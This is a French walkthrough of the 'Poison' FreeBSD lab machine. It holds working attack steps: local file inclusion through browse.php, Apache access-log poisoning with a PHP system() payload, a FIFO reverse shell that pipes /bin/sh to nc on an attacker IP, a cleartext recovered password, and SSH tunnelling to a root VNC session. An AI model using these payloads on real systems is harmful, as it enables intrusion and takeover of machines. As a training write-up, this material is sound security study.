Poison

FreeBSD Difficulté : Medium LFI Log poisoning Tunnel SSH

Un formulaire browse.php?file= vulnérable en inclusion de fichier locale (LFI) mène, via l'empoisonnement de l'access log Apache, à de l'exécution de commandes. De là : un mot de passe encodé treize fois en base64, un accès SSH, puis un tunnel vers un service VNC root n'écoutant qu'en local pour terminer en root.

Phase 0 — Scan

rustscan -a 10.129.1.254 -- -sV -sC
22/tcp open  ssh   OpenSSH 7.2 (FreeBSD 20161230)
80/tcp open  http  Apache httpd 2.4.29 (FreeBSD) PHP/5.6.32

L'OS est FreeBSD, à garder en tête en permanence : les chemins diffèrent de Linux, /bin/sh n'est pas bash (pas de /dev/tcp) et le nc de BSD n'a pas le même comportement que le netcat GNU.

Phase 1 — Reconnaissance web

Le code source de la page d'accueil donne tout :

Sites to be tested: ini.php, info.php, listfiles.php, phpinfo.php
<form action="/browse.php" method="GET">
    Scriptname: <input type="text" name="file">

Le paramètre file passé en GET est un schéma classique de LFI.

Phase 2 — Confirmation de la LFI

http://10.129.1.254/browse.php?file=/etc/passwd

Cela fonctionne. Dans la sortie, un vrai compte utilisateur apparaît :

charix:*:1001:1001:charix:/home/charix:/bin/csh

UID 1001, cible pour le user flag.

Phase 3 — De la LFI au RCE (log poisoning)

Trouver le chemin des logs

http://10.129.1.254/browse.php?file=/usr/local/etc/apache24/httpd.conf

On y lit CustomLog "/var/log/httpd-access.log". L'access log est plus fiable que l'error log : il enregistre toutes les requêtes, pas seulement celles en erreur.

Empoisonner le log via Burp

Intercepter une requête et remplacer l'en-tête User-Agent par du PHP :

User-Agent: <?php system($_GET['cmd']); ?>

En forwardant la requête, le payload est écrit tel quel dans l'access log.

Déclencher l'exécution

http://10.129.1.254/browse.php?file=/var/log/httpd-access.log&cmd=id
uid=80(www) gid=80(www) groups=80(www)
MéthodeUne fois le log empoisonné, inutile de repasser par Burp : on modifie simplement cmd= dans l'URL, le payload PHP reste actif dans le log.

Phase 4 — Reverse shell

C'est le point qui a posé problème. Plusieurs techniques standards échouent sur cet OS :

TentativeRésultatRaison
bash -i >& /dev/tcp/…Échec silencieuxLe /bin/sh de FreeBSD n'est pas bash, pas de support de /dev/tcp
nc -e /bin/sh IP PORTÉchecSur le netcat BSD, -e concerne la politique IPsec, pas l'exécution
which perl / pythonRienFreeBSD minimal, aucun interpréteur disponible

La solution qui fonctionne est un reverse shell par FIFO, qui ne dépend ni de bash ni de l'option -e :

rm /tmp/f; mkfifo /tmp/f; cat /tmp/f | /bin/sh -i 2>&1 | nc 10.10.15.150 3333 >/tmp/f

Payload passé URL-encodé dans cmd=. Côté attaquant : nc -lvnp 3333. Le message can't access tty; job control turned off confirme le FIFO plutôt qu'un vrai TTY.

LeçonSur BSD, vérifier nc -h en premier pour connaître les options réellement supportées, avant de perdre du temps sur des payloads qui semblent standards.

Phase 5 — Pivot vers charix

Un fichier pwdbackup.txt traîne dans le dossier web (/usr/local/www/apache24/data/). Son contenu est encodé en base64 de façon récursive (le fichier indique « encoded atleast 13 times »).

Sans l'indice, on le détecte en décodant pas à pas : tant que le résultat ressemble encore à du base64 pur, on continue. L'opération « Magic » de CyberChef automatise cette détection. Mot de passe obtenu : Charix!2#4%6&8(0.

ssh charix@10.129.1.254

Le home contient secret.zip (même mot de passe). Extrait avec bsdtar -xf secret.zip, il livre un fichier secret binaire : c'est un format propriétaire VNC, normal qu'il soit illisible en texte.

Phase 6 — Élévation de privilèges vers root

Découverte

ps aux
root  608  Xvnc :1 -desktop X ... -geometry 1280x800 -depth 2

Un service VNC tourne en root et n'écoute qu'en local (127.0.0.1).

Méthodeps aux doit être un réflexe systématique de la checklist d'élévation de privilèges. C'est lui qui révèle le VNC, indépendamment du fichier secret trouvé avant.

Tunnel SSH vers le port local

ssh -L 5901:127.0.0.1:5901 charix@10.129.1.254
  • 5901 (premier) : port ouvert sur ma machine
  • 127.0.0.1:5901 : destination vue depuis la cible, donc la cible elle-même

Dans un second terminal :

vncviewer 127.0.0.1::5901 -passwd secret

La session VNC s'ouvre en root. cat root.txt.

À retenir

  1. Toujours vérifier nc -h avant de supposer que -e se comporte comme sur le netcat GNU.
  2. Le reverse shell par FIFO est le plus universel quand l'environnement est incertain.
  3. ps aux et netstat -an | grep LISTEN sont des réflexes d'élévation de privilèges, pas des coups de chance.
  4. Face à un encodage répété inconnu : décoder et observer, sans connaître le nombre de tours à l'avance.
  5. Le port forwarding SSH local (-L) est à maîtriser pour atteindre les services « local only ».
